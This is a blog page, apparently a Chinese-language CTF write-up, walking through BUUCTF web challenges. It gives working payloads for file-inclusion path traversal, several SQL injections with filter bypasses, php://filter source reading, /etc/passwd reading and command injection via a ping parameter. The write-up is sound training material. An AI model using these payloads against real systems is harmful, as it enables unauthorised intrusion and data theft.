@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Buuctf刷题记录(一) |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Buuctf刷题记录-0"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Buuctf刷题记录(一)
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/01/12/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0/" class="article-date">
+  <time datetime="2021-01-12T03:10:25.000Z" itemprop="datePublished">2021-01-12</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/">刷题站</a> / <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/buuctf/">buuctf</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">5.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">27 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF]2018 WarmUp"></a>[HCTF]2018 WarmUp</h2><p>要不是我脸皮厚 第一题就能把我劝退 :slightly_smiling_face:</p>
+<p>右键源代码得到提示</p>
+<p>访问source.php 得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>先根据提示的 hint.php 得到信息</p>
+<p><code>flag not here, and flag in ffffllllaaaagggg</code></p>
+<p>看看几个需要知道的函数</p>
+<p>1.mb_substr()</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114212509625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>2.mb_strpos</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114212747465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>先分析 emmm这个类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">class emmm</span><br><span class="line">&#123;</span><br><span class="line">    public static function checkFile(&amp;$page)</span><br><span class="line">    &#123;</span><br><span class="line">        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;  //page必须不为空或为字符串</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;  //in_array()检测page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(  //如果page含有?，则获取page第一个?前的值并赋给_page变量</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  //检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);  //给_page二次赋值，使其等于URL解码之后的page</span><br><span class="line">        $_page = mb_substr(//得到hint(source).php</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)  //如果_page有?，则截取_page(URL解码后的page)两个?中间的值</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  //检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到函数代码中有四个if语句：</p>
+<p><em><strong>第一个if语句</strong></em> 对变量进行检验，要求$page为字符串，否则返回false <em>//因为返回False所以这里无用</em><br><em><strong>第二个if语句</strong></em> 判断$page是否存在于$whitelist数组中，存在则返回true<br><em><strong>第三个if语句</strong></em> 判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true<br><em><strong>第四个if语句</strong></em> 判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>若以上四个if语句均未返回值，则返回false</p>
+<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用</p>
+<p>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</p>
+<p>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。</p>
+<p><strong>只要这四个if语句有一个为true即可包含file</strong>，关键点在_page 经过截断后返回true.</p>
+<p>所以我们的突破点就在于第四个if语句中，只要满足他的条件，我们就可以包含文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page); </span><br><span class="line">$_page = mb_substr(</span><br><span class="line">　　$_page,</span><br><span class="line">　　0,</span><br><span class="line">　　mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) //得到hint(source).php的最后位置</span><br><span class="line">);if (in_array($_page, $whitelist)) &#123; </span><br><span class="line">　　return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里URL解码了一次$page值，这里需要注意的是，<em><strong>PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次</strong></em></p>
+<p>而这里在代码中又一次URL解码了一次，共计解码了两次，所以我们也需要对传入的值进行两次URL编码</p>
+<p>其次我们的突破点就在于这段代码只会截取?之前的字符串拿去和whitelist比对，因此只要确保?前的值是source.php或hint.php即可返回true</p>
+<p>等同于 /source.php?file=source.php%253Fxxxx 便可以使用include()函数包含 source.php?xxxx 这个文件(%253f是?URL编码两次后的值)</p>
+<p>所以可以构造Payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=source.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 ../ 的用途是返回上级目录</p>
+<p>ffffllllaaaagggg位于根目录下，一般Web服务的文件夹在/var/www/html目录中，再加上source.php?/这个“文件夹”，所以我们总共需要../四次来返回到根目录  当然你也可以用../更多次 毕竟是在根目录</p>
+<p>参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12635274.html">https://www.cnblogs.com/yesec/p/12635274.html</a></p>
+<h2 id="强网杯-2019随便注"><a href="#强网杯-2019随便注" class="headerlink" title="[强网杯]2019随便注"></a>[强网杯]2019随便注</h2><p>单引号试探 </p>
+<p><img src="https://img-blog.csdnimg.cn/20210114141920393.png" alt="在这里插入图片描述"></p>
+<p>然后 1’# 成功回显，发现并没有过滤注释符</p>
+<p><code>1&#39;order by 2#</code>检测发现两个字段</p>
+<p>使用联合注入的时候发现大部分的注入方法都被过滤了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114141947895.png" alt="在这里插入图片描述"></p>
+<p>用sqlmap跑了一下得到库名: supersqli</p>
+<p>后面发现可以使用堆叠注入</p>
+<p>查出表名  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables from supersqli;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210114142009224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from words;#</span><br></pre></td></tr></table></figure>
+
+<p>这个表好像没什么可以用的信息,有两个字段  id和data</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+
+<p>注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
+<p>eg.  mysql&gt; SELECT * FROM   <code>table</code>   WHERE  <code>id</code> = ‘123’ ;</p>
+<p>1919810931114514必须用反单引号括起来，但是words不需要，我也不知道为什么,向大佬求解</p>
+<p>这个表中发现字段flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114142029194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>之前不是通过 order by查询是有两个字段吗 ,可以猜测到现在sql语句查询的是word这个表里面的数据</p>
+<p>接下来就是用各种膜拜大佬们的wp,下面这个是很骚的解法</p>
+<h3 id="解法一-改名"><a href="#解法一-改名" class="headerlink" title="解法一:改名"></a>解法一:改名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1&#x27; or 1=1#爆出表所有内容就可以查flag啦</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改表名:RENAME TABLE &lt;旧表名&gt; TO &lt;新表名&gt;;</span><br><span class="line">修改字段名:alter table &lt;表名&gt; change &lt;字段名&gt; &lt;字段新名称&gt; &lt;字段的类型&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` VARCHAR(50);#</span><br></pre></td></tr></table></figure>
+
+<p>然后 <code>1&#39; or 1=1 #</code> 爆出flag</p>
+<h3 id="解法二-预处理语句-堆叠注入"><a href="#解法二-预处理语句-堆叠注入" class="headerlink" title="解法二:预处理语句+堆叠注入"></a>解法二:预处理语句+堆叠注入</h3><p>先了解预处理语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用</span><br><span class="line">EXECUTE ：执行命令</span><br><span class="line">DEALLOCATE PREPARE：释放命令</span><br></pre></td></tr></table></figure>
+
+<p>测试</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114142049172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;s&#x27;,&#x27;elect `flag` from `1919810931114514`&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27;* from `1919810931114514`&#x27;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考:<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6c6a44517dd7">https://www.jianshu.com/p/6c6a44517dd7</a></p>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战] 2019 EasySQL"></a>[极客大挑战] 2019 EasySQL</h2><p>测试得到是单引号闭合</p>
+<p>万能密码就能爆出flag</p>
+<p><strong>payload:</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uername:-1</span><br><span class="line">password: 1&#x27;or 1 =1%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战]2019 Havefun"></a>[极客大挑战]2019 Havefun</h2><p>查看源码,发现代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[&#x27;cat&#x27;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&#x27;dog&#x27;)&#123;</span><br><span class="line">echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>原来感觉是命令执行…..随便穿了一个dog就出flag了。。。。</p>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>尝试看看 查询当前数据库名</p>
+<p><img src="https://ae01.alicdn.com/kf/U85c1a3fe2bba44bd97aa4c685f4285d5R.jpg"></p>
+<p>测试可以发现我们输入数据的位置应该在  select x,x,x from aaaaaa 的 x 位置</p>
+<p>输入 *,1 尝试 直接读出来了。。。。。估计是非预期</p>
+<p>接着我尝试堆叠注入  <code>1;show tables;</code> 发现flag这个表,再去读的时候发现过滤了 from。。。不会了 看看大佬的wp吧</p>
+<p>内置的sql语句为<code>sql =&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</code></p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>补充系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+<p>将sql_mode设置为PIPES_AS_CONCAT的话，||就不再是逻辑or了，而变成了字符串连接符。<br>因此设置之后<code>select 1||flag from Flag</code>就变成了将<code>select 1 from Flag</code>和<code>select flag from Flag</code>的结果拼接到一起了。而且使用字母连接会报错，使用数字连接才会查询出数据。</p>
+<p>本地测试一下:</p>
+<p><img src="https://ae01.alicdn.com/kf/U265bf89c1aa54e8bb93494551df95390F.jpg"></p>
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020]新生赛 Include"></a>[ACTF2020]新生赛 Include</h2><p>打开题目 tips</p>
+<p>发现地址栏有个file参数 明显的文件包含</p>
+<p>尝试读取  ../../../../../etc/passwd  ,可以成功</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战]2019 Secret File"></a>[极客大挑战]2019 Secret File</h2><p>打开题目右键查看源码</p>
+<p>发现 Archi ve_room.php</p>
+<p>然后 点进去源码又发现action.php</p>
+<p>然后会重定向到 end.php</p>
+<p>bp抓包 发现 secr3t.php  发现源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>伪协议读取得到flag</p>
+<p>payload: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战]2019 LoveSQL"></a>[极客大挑战]2019 LoveSQL</h2><p>打开题目 order by发现字段为3</p>
+<p>查表: 有两个 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=d&amp;password=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210114165135624.png" alt="在这里插入图片描述"></p>
+<p>查表 l0ve1ysq1 的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=d&amp;password=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210114165050773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查数据得到flag  但是我竟然蠢到用 limit 读取。。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=1&#x27; union select 2,2,password from `l0ve1ysq1` limit 15,1%23</span><br></pre></td></tr></table></figure>
+
+<p>可以用 group_concat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=1&#x27; union select 2,2,group_concat(password) from `l0ve1ysq1`%23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">group_concat()函数</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator &#x27;分隔符&#x27;] )</span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开题目发现是rce</p>
+<p>尝试读取:  没有过滤分号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210114234736150.png" alt="在这里插入图片描述"></p>
+<p>直接cat flag.php 不行 估计是flag被过滤了使用变量拼接  发现空格被过滤 使用 $IFS$9 绕过</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>发现没过滤空格也没过滤分号 直接查看根目录发先flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls /;</span><br></pre></td></tr></table></figure>
+
